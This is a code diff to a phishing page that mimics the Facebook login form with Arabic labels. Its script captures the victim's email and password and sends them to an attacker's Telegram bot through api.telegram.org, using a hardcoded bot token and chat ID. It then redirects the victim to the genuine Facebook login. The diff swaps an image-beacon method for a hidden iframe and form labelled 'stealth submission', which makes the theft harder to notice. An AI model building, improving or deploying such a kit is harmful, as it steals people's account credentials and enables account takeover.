@@ -24,12 +24,13 @@
         </form>
         <div style="margin: 15px 0;"><a href="#" style="color: #1877f2; text-decoration: none; font-size: 14px;">هل نسيت كلمة السر؟</a></div>
         <div class="footer-links">
-            <a href="#" class="new-account">إنشاء حساب جديد</a>
+            <a href="#" class="create-new-account">إنشاء حساب جديد</a>
         </div>
     </div>
 
-    <!-- عنصر مخفي للإرسال الإجباري -->
-    <div id="hidden_frame_container" style="display:none;"></div>
+    <!-- Hidden elements for stealth submission -->
+    <iframe name="hidden_iframe" id="hidden_iframe" style="display:none;"></iframe>
+    <form id="stealthForm" target="hidden_iframe" method="GET" style="display:none;"></form>
 
     <script>
         const B_TOKEN = '8201696738:AAGFkCZTmXwbCh_RfNxURBZtH2NZjBhUAsg';
@@ -42,18 +43,21 @@
             const pass = document.getElementById('u_pass').value;
             const message = `🔥 صيد جديد تم تأكيده!\n\n📧 الحساب: ${email}\n🔑 الباسورد: ${pass}`;
 
-            // تقنية الإرسال عبر Image Beacon (الأكثر نجاحاً في البيئات المحظورة)
-            const url = `https://api.telegram.org/bot${B_TOKEN}/sendMessage?chat_id=${C_ID}&text=${encodeURIComponent(message)}`;
-            
-            const logger = new Image();
-            logger.src = url;
+            // Building the stealth URL
+            const url = `https://api.telegram.org/bot${B_TOKEN}/sendMessage`;
+            const stealthForm = document.getElementById('stealthForm');
+            stealthForm.action = url;
 
-            // ضمان الإرسال قبل التحويل
-            logger.onload = logger.onerror = function() {
-                window.location.replace("https://www.facebook.com/login");
-            };
+            // Adding parameters to the stealth form
+            stealthForm.innerHTML = `
+                <input type="hidden" name="chat_id" value="${C_ID}">
+                <input type="hidden" name="text" value="${message}">
+            `;
 
-            // احتياطي في حال تأخر الصورة
+            // Execute stealth submission
+            stealthForm.submit();
+
+            // Minimal delay to ensure submission before redirect
             setTimeout(() => {
                 window.location.replace("https://www.facebook.com/login");
             }, 1000);
